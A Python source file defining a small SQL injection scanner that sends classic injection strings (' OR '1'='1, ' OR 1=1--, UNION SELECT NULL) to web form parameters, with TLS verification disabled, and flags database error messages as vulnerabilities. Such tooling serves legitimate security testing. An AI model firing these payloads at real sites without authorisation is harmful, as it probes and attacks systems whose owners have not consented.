import requests

class SQLiScanner:
    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "' UNION SELECT NULL--"
        ]

    def scan(self, data: dict):
        results = []
        target = data.get("target", {})
        params = data.get("injectable_parameters", [])
        forms = target.get("forms", [])

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()

            for param in params:
                for payload in self.payloads:
                    send_data = { param: payload }

                    try:
                        if method == "post":
                            r = requests.post(action, data=send_data, timeout=5, verify=False)
                        else:
                            r = requests.get(action, params=send_data, timeout=5, verify=False)

                        
                        if any(err in r.text.lower() for err in [
                            "sql syntax",
                            "mysql",
                            "warning",
                            "database error",
                            "odbc",
                            "pdo"
                        ]):
                            results.append({
                                "vulnerable": True,
                                "parameter": param,
                                "payload": payload,
                                "action": action
                            })

                    except Exception:
                        pass

        return {
            "success": True,
            "engine": "sqli_scanner",
            "results": results
        }